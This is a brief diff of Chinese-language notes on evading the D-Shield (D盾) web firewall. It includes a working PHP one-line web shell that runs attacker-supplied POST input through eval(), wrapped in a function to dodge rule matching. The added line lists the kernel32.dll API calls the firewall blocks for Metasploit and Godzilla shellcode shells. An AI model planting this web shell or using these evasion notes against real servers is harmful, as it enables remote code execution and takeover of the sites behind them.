@@ -2,3 +2,4 @@ how to bypass Ddun,this is a good question
 匹配规则库进行拦截
 一句话木马：
 <?php $a ="www.yuag.com"; function yuag($a){ echo eval($a); } @ yuag($_POST['yuag']); print "$a";
+这个版本的D盾防火墙拦截了kernel32.dll的以下几个API函数。msf-shellcode.aspx、intosec-shellcode.aspx脚本的VirtualAlloc，哥斯拉Csharp马连接时的LoadLibraryW
